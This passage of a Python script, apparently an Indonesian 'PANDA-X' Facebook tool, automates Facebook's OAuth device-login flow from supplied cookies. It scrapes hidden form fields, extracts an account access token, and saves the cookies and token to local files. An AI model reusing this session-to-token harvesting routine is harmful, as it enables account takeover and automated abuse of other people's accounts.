					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookies': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookies': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookies': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookies': your_cookies}).text
							tok = re.search('"access_token": "(.*?)"', str(response7)).group(1).replace('["','')
							print("")
							open("PANDA-X/cokiku.txt","w").write(your_cookies)
							open("PANDA-X/tokenku.txt","w").write(tok)
							time.sleep(0.5);masukk()
			except Exception as e:
				os.system('rm -rf PANDA-X/cokiku.txt');os.system('rm -rf PANDA-X/tokenku.txt')
				print("Cokies Tidak Berfungsi, Enter\nUntuk Login Ulang")
				Oi = input(N+''+B+'   ╰─ > \033[32m')
				if Oi in (""):
					login_dulu()
	except:pass
	
	

def masukk():
	try:
		token = open('PANDA-X/tokenku.txt','r').read()
		cok = open('PANDA-X/cokiku.txt','r').read()
		tokenku.append(token)
		try:
			menu()
		except KeyError:
			os.system('rm -rf PANDA-X/cokiku.txt');os.system('rm -rf PANDA-X/tokenku.txt');login_dulu()
		except requests.exceptions.ConnectionError:
			print("opsh sinyal Lemah");exit()
	except IOError:
		os.system('rm -rf PANDA-X/cokiku.txt');os.system('rm -rf PANDA-X/tokenku.txt');login_dulu()


if __name__=='__main__':
	masukk()